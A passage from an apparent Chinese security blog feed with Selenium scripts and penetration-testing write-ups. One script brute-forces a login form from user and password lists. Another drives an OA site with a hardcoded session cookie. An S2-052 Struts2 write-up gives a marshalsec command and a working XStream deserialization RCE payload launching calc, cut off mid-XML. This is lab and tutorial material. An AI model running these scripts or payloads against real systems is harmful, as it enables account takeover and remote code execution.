class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cusLogin</span><span class="params">(u,p)</span>:</span></span><br><span class="line">    browser.get(<span class="string">'http://localhost/LoginDemo/logindemo.html'</span>)</span><br><span class="line">    browser.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">    elem=browser.find_element_by_id(<span class="string">"input1"</span>)</span><br><span class="line">    elem.send_keys(u)</span><br><span class="line">    elem=browser.find_element_by_id(<span class="string">"input2"</span>)</span><br><span class="line">    elem.send_keys(p)</span><br><span class="line">    elem=browser.find_element_by_id(<span class="string">"but"</span>)</span><br><span class="line">    <span class="comment">#print browser.current_window_handle</span></span><br><span class="line">    elem.click()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'success'</span> <span class="keyword">in</span> browser.page_source:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'###'</span>,u,p,<span class="string">'###'</span>,<span class="string">'Login Success'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'LoginFaild'</span></span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'pass.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> fP:</span><br><span class="line">    <span class="keyword">for</span> pass1 <span class="keyword">in</span> fP.readlines():</span><br><span class="line">        p = pass1.strip()</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'user.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> fU:</span><br><span class="line">            <span class="keyword">for</span> user1 <span class="keyword">in</span> fU.readlines():</span><br><span class="line">                u = user1.strip()</span><br><span class="line">                <span class="keyword">print</span> u,p,<span class="string">'test...'</span></span><br><span class="line">                cusLogin(u,p)</span><br><span class="line">    browser.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><p>最终效果图<br><img src="CommSum.gif" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;@序&quot;&gt;&lt;/a&gt;@序&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;渗透过程经常遇到登录界面的密码是加密处理的，有时加密算法为md5,有时候为目标系统自定义的算法，但基于已知算法的爆破还是比较成熟的， 常规的base64和md5都可以通过Burp完成爆破，能够在js看到算法的可以通过自定义脚本来完成。&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;但如果是未知加密算法，例如每次登录请求都有随机码作为盐值去加密校验密码是否正确，我们该如何Bypass，本篇主要讲解基于Seleinum的 python 脚本实现自动登录，完成暴力破解。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="seleinum" scheme="http://yoursite.com/tags/seleinum/"/>
    
  </entry>
  
  <entry>
    <title>python selenium 初探</title>
    <link href="http://yoursite.com/2017/10/29/python-selenium-%E5%88%9D%E6%8E%A2/"/>
    <id>http://yoursite.com/2017/10/29/python-selenium-初探/</id>
    <published>2017-10-29T13:36:12.000Z</published>
    <updated>2017-10-31T06:53:50.129Z</updated>
    
    <content type="html"><![CDATA[<p>初探python selenium</p><p>   做一些WEB相关的自动化处理，模块还是很好用的，之前一直针对某个单一页面进行特征比对判断及测试。使用了selenium后，感觉在自动化角度还有很大的空间。<br>   目前自发主要用途比如免去加密登录的暴力破解；针对多级操作的流程处理等等。当然不仅局限于此。这个过程主要的报错就是XPATH定位时的Unable to locate element（无法定位到元素），其实主要的原因还是handle句柄的变化，以及部分页面的刷新时间的原因。<br><a id="more"></a></p><p>脚本初探总结如下：</p><p>最初的想法是自动批量提交成百上千的流程。<br>主要逻辑就是：</p><pre><code>1. 访问oa首页，然后把cookie填充2. 携cookie，访问待办事宜页面3. 针对待办事宜的页面，进行div首元素查找并点击4. 针对新页面的提交按钮进行点击</code></pre><p>有几个注意点，值得归纳总结</p><pre><code>1. 开启浏览器除了正常的模块引用，还要下载浏览器配对的webdirver，并置于环境变量能够引导的路径2. 携带cookie访问，前提是先增加cookie进入，但不能直接访问目的页面。先访问下首页，然后add，然后再访问目的页面3. cookie必须得是key value 形式，不能按照常规数据包那种json格式，使用这种格式：cookie ={&apos;name&apos;:&apos;JSESSIONID&apos;,&apos;value&apos;:&apos;aaaZzzItnQOrm_T4ihLZv&apos;}4. 若操作行为出现点击，一般会有新的handle，所以要在新页面去查找元素，必须得使用switch（browser.switch_to_window(browser.window_handles[n])）5. 由于各个页面的点击，可能加载缓慢，所以保证完全加载后再进行元素查找，所以可以使用time.sleep(2)6. 原理上所有的网页元素可以通过xpath来表达，所以chrome可使用F12的审查元素来配套结合7. xpath中若存在引号，必须使用\进行转义，否则不能正确引用8. 这个过程最多的报错就是Unable to locate element （无法定位元素问题），主要原因只顾于对元素方法的定位，却没有意识到页面发生跳转后的handles的变化    1. selenium 默认的handle 就是0 ，所以当点击按钮后出现的是新handle(也可理解为浏览器的新标签)，若在新的标签中取值，必须得切换handle    2. 为了循环处理循环体，还得把handle重归位为0（首页句柄），这样才能是新的开始，否则仍然按照新打开的handle去定位老元素，仍然会提示Unable to locate element9. 关于浏览器页面和页签，可把开启打开访问置于循环体外面，针对浏览器标签的关闭可使用browser.close() , 针对浏览器整体的关闭可使用browser.quit()10. 有几个用法：    1. 打印输出当前handle：print browser.current_window_handle    2. 打印输出所有handle：print browser.window_handles    3. 打印输出当前cookie：print browser.get_cookies()    4. 打印输出当前URL   ：print browser.current_url</code></pre><p>脚本demo如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">accessFBIOA</span><span class="params">(browser)</span>:</span></span><br><span class="line">    browser.get(<span class="string">'https://oa.fbi.com.cn/'</span>)</span><br><span class="line">    cookie =&#123;<span class="string">'name'</span>:<span class="string">'JSESSIONID'</span>,<span class="string">'value'</span>:<span class="string">'aaaZzzItnQOrm_T4ihLZv'</span>&#125;</span><br><span class="line">    browser.add_cookie(cookie)</span><br><span class="line">    <span class="keyword">print</span> browser.current_window_handle</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'step 1 ok'</span></span><br><span class="line"></span><br><span class="line">    browser.get(<span class="string">"https://oa.FBI.com.cn/vworkflow/workflow/workflowbaselist.jsp?action=searchall&amp;isfinished=0&amp;isnew=1&amp;sqlwhere=operatetype%3E1"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> browser.current_window_handle</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'step 2 ok'</span></span><br><span class="line"></span><br><span class="line">    browser.find_element_by_xpath(<span class="string">"//*[@id=\"datagrid-row-r1-2-0\"]/td[4]/div/a"</span>).click()</span><br><span class="line">    <span class="keyword">print</span> browser.current_window_handle</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'step 3 ok'</span></span><br><span class="line">    now_url = browser.current_url</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#第四步，定位提交按钮</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        browser.switch_to_window(browser.window_handles[<span class="number">1</span>])</span><br><span class="line">        browser.find_element_by_xpath(<span class="string">"//button[@id='button_F']"</span>).click()</span><br><span class="line">        <span class="comment">#print 'element has located'</span></span><br><span class="line">        <span class="comment">#break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'no focus'</span></span><br><span class="line">    <span class="keyword">print</span> browser.current_window_handle</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'step 4 ok'</span></span><br><span class="line">    browser.close()</span><br><span class="line">    <span class="comment">#browser.quit()</span></span><br><span class="line">    <span class="comment">#便于循环初始进行，所以要切换handle</span></span><br><span class="line">    browser.switch_to_window(browser.window_handles[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    browser = webdriver.Chrome()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"######Current Process"</span>,str(i),<span class="string">"######"</span></span><br><span class="line">        accessTassOA(browser)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;初探python selenium&lt;/p&gt;
&lt;p&gt;   做一些WEB相关的自动化处理，模块还是很好用的，之前一直针对某个单一页面进行特征比对判断及测试。使用了selenium后，感觉在自动化角度还有很大的空间。&lt;br&gt;   目前自发主要用途比如免去加密登录的暴力破解；针对多级操作的流程处理等等。当然不仅局限于此。这个过程主要的报错就是XPATH定位时的Unable to locate element（无法定位到元素），其实主要的原因还是handle句柄的变化，以及部分页面的刷新时间的原因。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入关联分析</title>
    <link href="http://yoursite.com/2017/10/18/SQL%E6%B3%A8%E5%85%A5%E5%85%B3%E8%81%94%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2017/10/18/SQL注入关联分析/</id>
    <published>2017-10-18T14:27:11.000Z</published>
    <updated>2019-02-16T10:30:30.708Z</updated>
    
    <content type="html"><![CDATA[<p>目录如下<br>雪球技术之SQL注入    1<br>0    序    3<br>1    基本科普    3<br>    1.1    概念说明    3<br>    1.2    注入分类    4<br>2    神器解读    4<br>    2.1    何为神器    4<br>    2.2    源码精读    6<br>3    数据库特性    8<br>    3.1    Web报错关键字    8<br>    3.2    版本查询    8<br><a id="more"></a><br>    3.3    SQL方言差异    9<br>    3.4    SQL常用语句    9<br>    3.5    盲注函数    10<br>4    手工注入    11<br>    4.1    应用场景    11<br>    4.2    常用语句    11<br>5    漏洞挖掘    13<br>    5.1    黑盒测试    13<br>    5.2    代码审计    14<br>6    安全加固    19<br>    6.1    源码加固    19<br>    6.2    产品加固    21<br>7    关联应用    21<br>    7.1    Getshell    21<br>    7.1.1    普通的shell方法    21<br>    7.1.2    PHPmyadmin shell方法    21<br>    7.1.3    MSSQL DBA权限getwebshell    21<br>    7.2    关联功能点    22<br>8    参考资料    23</p><p>Drops细节参见<a href="http://www.cnblogs.com/shellr00t/p/7689465.html" target="_blank" rel="noopener">http://www.cnblogs.com/shellr00t/p/7689465.html</a></p><p>sm0nk 原创首发于乌云平台，后因乌云关停，特归档致此。<br>原链接 <a href="http://drops.wooyun.org/web/16972" target="_blank" rel="noopener">http://drops.wooyun.org/web/16972</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;目录如下&lt;br&gt;雪球技术之SQL注入    1&lt;br&gt;0    序    3&lt;br&gt;1    基本科普    3&lt;br&gt;    1.1    概念说明    3&lt;br&gt;    1.2    注入分类    4&lt;br&gt;2    神器解读    4&lt;br&gt;    2.1    何为神器    4&lt;br&gt;    2.2    源码精读    6&lt;br&gt;3    数据库特性    8&lt;br&gt;    3.1    Web报错关键字    8&lt;br&gt;    3.2    版本查询    8&lt;br&gt;
    
    </summary>
    
      <category term="攻防渗透" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>工控安全入门分析</title>
    <link href="http://yoursite.com/2017/10/18/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2017/10/18/工控安全入门分析/</id>
    <published>2017-10-18T14:03:26.000Z</published>
    <updated>2017-10-18T14:33:16.859Z</updated>
    
    <content type="html"><![CDATA[<ol><li>专业术语</li><li><p>协议端口及探测脚本<br>2.1 协议科普<br>2.2 信息探测<br> Ethernet/IP 44818<br> Modbus 502<br> IEC 61870-5-101/104 2404<br> Siemens S7 102<br> Tridium Niagara Fox 1911</p><a id="more"></a><p><img src="infoCollect.png" alt><br>2.3 脚本资源<br> Github测试脚本<br> <a href="https://github.com/atimorin/scada-tools" target="_blank" rel="noopener">https://github.com/atimorin/scada-tools</a><br> <a href="https://github.com/atimorin/PoC2013" target="_blank" rel="noopener">https://github.com/atimorin/PoC2013</a><br> <a href="https://github.com/drainware/scada-tools" target="_blank" rel="noopener">https://github.com/drainware/scada-tools</a><br> <a href="https://github.com/drainware/nmap-scada" target="_blank" rel="noopener">https://github.com/drainware/nmap-scada</a><br> Exploit-db测试脚本<br> <a href="https://www.exploit-db.com/exploits/19833/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/19833/</a><br> <a href="https://www.exploit-db.com/exploits/19832/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/19832/</a><br> <a href="https://www.exploit-db.com/exploits/19831/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/19831/</a><br> <a href="https://www.exploit-db.com/search/?action=search&amp;description=scada&amp;e_author=" target="_blank" rel="noopener">https://www.exploit-db.com/search/?action=search&amp;description=scada&amp;e_author=</a></p></li><li><p>乌云工控漏洞分析<br>3.1 工控相关漏洞分析<br>3.2 工控精华漏洞分析</p></li><li><p>参考资源<br>4.1 工控专题<br>4.2 牛人分享<br>4.3 其他参考</p></li></ol><p>原文详细内容请参见 <a href="http://www.cnblogs.com/shellr00t/p/7687700.html" target="_blank" rel="noopener">http://www.cnblogs.com/shellr00t/p/7687700.html</a></p><p>原创首发于乌云平台，后来乌云消失了。所以在此归档下<br>原链接：<a href="http://drops.wooyun.org/tips/8594" target="_blank" rel="noopener">http://drops.wooyun.org/tips/8594</a> （致我们已失去的乌云…）</p>]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;专业术语&lt;/li&gt;
&lt;li&gt;&lt;p&gt;协议端口及探测脚本&lt;br&gt;2.1 协议科普&lt;br&gt;2.2 信息探测&lt;br&gt; Ethernet/IP 44818&lt;br&gt; Modbus 502&lt;br&gt; IEC 61870-5-101/104 2404&lt;br&gt; Siemens S7 102&lt;br&gt; Tridium Niagara Fox 1911&lt;/p&gt;
    
    </summary>
    
      <category term="归纳总结" scheme="http://yoursite.com/categories/%E5%BD%92%E7%BA%B3%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="工控安全" scheme="http://yoursite.com/tags/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>逻辑漏洞归纳总结</title>
    <link href="http://yoursite.com/2017/10/18/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2017/10/18/逻辑漏洞归纳总结/</id>
    <published>2017-10-18T03:23:09.000Z</published>
    <updated>2019-02-16T10:23:42.869Z</updated>
    
    <content type="html"><![CDATA[<p>Web安全渗透方向，三大核心：输入输出、登录体系、权限认证。<br>典型的web漏洞：注入、跨站、上传、代码执行等属于输入输出这个层级，这也是OWASP早期比较侧重的；近年来，像越权漏洞、逻辑绕过、接口安全等逐渐增多，这些属于登录体系和权限认证这个层级。</p><p>业务逻辑漏洞主要包括以下分类：<br>1.登录体系安全<br>2.业务一致性<br>3.业务数据篡改<br>4.密码找回<br>5.验证码突破<br>6.会话权限<br>7.数据重放<br>8.接口安全</p><a id="more"></a><p><img src="logicVuls.png" alt><br><img src="apiSec.png" alt><br><img src="PaySec.png" alt></p><p>Drops细节参见<a href="http://blog.sina.com.cn/s/blog_d7058b150102vpaw.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_d7058b150102vpaw.html</a><br>时隔多年，逻辑漏洞也该更新利用姿势了…</p><p>sm0nk 原创文章，原文发布在drops.wooyun.org/web/6917（致我们已逝去的乌云）</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Web安全渗透方向，三大核心：输入输出、登录体系、权限认证。&lt;br&gt;典型的web漏洞：注入、跨站、上传、代码执行等属于输入输出这个层级，这也是OWASP早期比较侧重的；近年来，像越权漏洞、逻辑绕过、接口安全等逐渐增多，这些属于登录体系和权限认证这个层级。&lt;/p&gt;
&lt;p&gt;业务逻辑漏洞主要包括以下分类：&lt;br&gt;1.登录体系安全&lt;br&gt;2.业务一致性&lt;br&gt;3.业务数据篡改&lt;br&gt;4.密码找回&lt;br&gt;5.验证码突破&lt;br&gt;6.会话权限&lt;br&gt;7.数据重放&lt;br&gt;8.接口安全&lt;/p&gt;
    
    </summary>
    
      <category term="攻防渗透" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="业务逻辑" scheme="http://yoursite.com/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/"/>
    
  </entry>
  
  <entry>
    <title>代理转发工具汇总分析</title>
    <link href="http://yoursite.com/2017/10/18/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2017/10/18/代理转发工具汇总分析/</id>
    <published>2017-10-18T02:10:39.000Z</published>
    <updated>2017-10-18T14:33:30.989Z</updated>
    
    <content type="html"><![CDATA[<ol start="0"><li>序</li><li>关于代理的说明</li><li>关于多个代理转发工具的使用心得</li><li>解释下Web代理的原理和重要性</li><li>其他工具的一些使用方法概要</li><li>附录-参考资料<a id="more"></a></li></ol><p><img src="totalrev.png" alt><br><img src="detail.png" alt></p><p>篇幅有限，细节原文参见 <a href="http://www.cnblogs.com/shellr00t/p/5856361.html" target="_blank" rel="noopener">http://www.cnblogs.com/shellr00t/p/5856361.html</a></p><p>sm0nk 原创文章，首发t00ls，且设置为精华<br><a href="https://www.t00ls.net/thread-35614-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-35614-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;ol start=&quot;0&quot;&gt;
&lt;li&gt;序&lt;/li&gt;
&lt;li&gt;关于代理的说明&lt;/li&gt;
&lt;li&gt;关于多个代理转发工具的使用心得&lt;/li&gt;
&lt;li&gt;解释下Web代理的原理和重要性&lt;/li&gt;
&lt;li&gt;其他工具的一些使用方法概要&lt;/li&gt;
&lt;li&gt;附录-参考资料
    
    </summary>
    
      <category term="归纳总结" scheme="http://yoursite.com/categories/%E5%BD%92%E7%BA%B3%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="代理转发" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Struts2RCE漏洞之S2-052</title>
    <link href="http://yoursite.com/2017/09/12/Struts2RCE%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-052/"/>
    <id>http://yoursite.com/2017/09/12/Struts2RCE漏洞之S2-052/</id>
    <published>2017-09-12T15:17:46.000Z</published>
    <updated>2021-07-27T07:55:10.885Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="基本信息">基本信息</span></h1><p>漏洞编号  CVE-2017-9805(S2-052)<br>影响版本  Struts 2.5 - Struts 2.5.12, Struts 2.3.x<br>漏洞概述  问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反序列化转换成对象时，导致任意代码执行漏洞。<br>漏洞原理  跟上那些注入OGNL表达式，达到远程代码执行的方式还不大一样，S2-052漏洞是一种XML反序列化漏洞。漏洞本质是Struts2 REST插件的XStream组件存在反序列化漏洞，当使用XStream组件对XML格式的数据包进行反序列化操作时，没有对数据内容进行有效验证，存在反序列化后远程代码执行安全隐患。</p><a id="more"></a><!-- toc --><ul><li><a href="#搭建环境">搭建环境</a></li><li><a href="#payload生成">payload生成</a></li><li><a href="#漏洞利用">漏洞利用</a></li><li><a href="#拓展">拓展</a></li></ul><!-- tocstop --><h1><span id="搭建环境">搭建环境</span></h1><p>tomcat部署 war<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">从struts2的官网下载最后受影响的版本struts-2.5.12，地址： </span><br><span class="line">http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip </span><br><span class="line">注意下载struts-2.5.12-apps即可，不需要下载struts-2.5.12-all.zip。不然struts-2.5.12-all.zip中包含很多其他的东西，可以看到lib目录下有很多jar包。</span><br><span class="line">struts2-rest-showcase，插件的默认配置支持xml扩展</span><br></pre></td></tr></table></figure></p><p><img src="s2.png" alt></p><p>默认配置server.xml 默认不变<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Host name=&quot;localhost&quot;  appBase=&quot;webapps&quot;</span><br><span class="line">unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;</span><br><span class="line">xmlValidation=&quot;false&quot; xmlNamespaceAware=&quot;false&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>直接使用jspstudy 不可以，有可能精简过环境。新搭建的tomcat9 没有问题</p><h1><span id="payload生成">payload生成</span></h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用marshalsec（https:<span class="comment">//github.com/mbechler/marshalsec）生成Payload，工具简单使用方式如下</span></span><br><span class="line">java -cp marshalsec-<span class="number">0.0</span>.1-SNAPSHOT-all.jar marshalsec.XStream ImageIO calc &gt; <span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><p>payload, 目前此payload为windows 开启calc 计算器弹窗的。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">"javax.crypto.CipherInputStream"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">"javax.crypto.NullCipher"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">opmode</span>&gt;</span>0<span class="tag">&lt;/<span class="name">opmode</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"java.util.Collections$EmptyIterator"</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">redirectErrorStream</span>&gt;</span>false<span class="tag">&lt;/<span class="name">redirectErrorStream</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">next</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.ImageIO$ContainsFilter"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"string"</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">next</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">lock</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder$NullInputStream"</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span></span><br><span class="line">              <span 